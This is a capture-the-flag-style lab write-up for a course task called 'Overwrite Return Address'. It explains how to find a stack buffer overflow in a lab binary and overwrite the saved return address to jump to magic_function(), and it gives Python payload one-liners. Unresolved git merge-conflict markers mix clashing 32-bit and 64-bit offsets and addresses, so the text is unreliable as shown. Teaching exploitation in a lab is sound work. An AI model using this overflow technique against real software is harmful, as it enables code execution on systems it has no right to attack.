---
nav_order: 1
parent: 'Task: Overwrite Return Address'
---

# Writeup

First use this command to scan the executable:

> ```Bash
> objdump -M intel -d break_this
> ```

- The `main()` function only calls `read_buffer()`.
- This function reads the length of a buffer from standard input into a variable `n`.
- Then it reads the buffer itself (`char buffer[64]`).
- Because `fgets()` reads at most `n - 1` characters, we can set `n` to a value bigger than the length of the buffer, so an overflow may be possible.
<<<<<<< HEAD
- We will set `n` to a large enough value: `100`
- `magic_function()` starts at address `0x080491d6`
- We see that the buffer passed where `fgets()` reads starts at `ebp - 0x58`.
- At the address pointed by `ebp` we find the saved `ebp` which we must skip, followed by the return address that we need to overwrite.
- So we must use `0x58 + 4 = 92` dummy characters `A` and then the address of `magic_function()` in little-endian encoding.

We can find the address of the `magic_function()` using this command:
=======
- We will set `n` to a large enough value: `120`

- `magic_function()` starts at address `0x401176`
- From the first 3 lines from `read_buffer()` we get that: `rbp` gets pushed on the stack, then the stack is extended by `0x60` = `96`
- So we must print `96 + 8 = 104` dummy characters `A` and then the address of `magic_function()` in little-endian encoding
>>>>>>> 8be8dac (labs/lab-10: Add x86_64 version)

```console
student@hsi:/.../overwrite-ret-addr/support$ nm break_this | grep magic_function
080491d6 T magic_function
```

<<<<<<< HEAD
``` Bash
python2.7 -c 'print "100\n" + "A" * 92 + "\xd6\x91\x04\x08"' > payload
=======
However, keep in mind that the stack alignment is 16 bytes for `x64` systems, so the `buffer` variable along with the other four will be aligned to 16 bytes. This is how the variable placement looks like after the stack is aligned:

```c
char buffer[68];                // [rsp+0h] [rbp-60h] BYREF
int n;                          // [rsp+44h] [rbp-1Ch] BYREF
size_t len;                     // [rsp+48h] [rbp-18h]
unsigned int disorienting_var;  // [rsp+54h] [rbp-Ch]
size_t i;                       // [rsp+58h] [rbp-8h]
```

Also make sure to properly pack the address of `magic_function()` in little-endian format (8 bytes). (0x0000000000401176)

``` Bash
python2.7 -c 'print "120\n" + "A" * 104 + "\x76\x11\x40\x00\x00\x00\x00\x00"' > payload
# or
python3 -c 'print("120\n" + "A" * 104 + "\x76\x11\x40\x00\x00\x00\x00\x00")' > payload
>>>>>>> 8be8dac (labs/lab-10: Add x86_64 version)
```
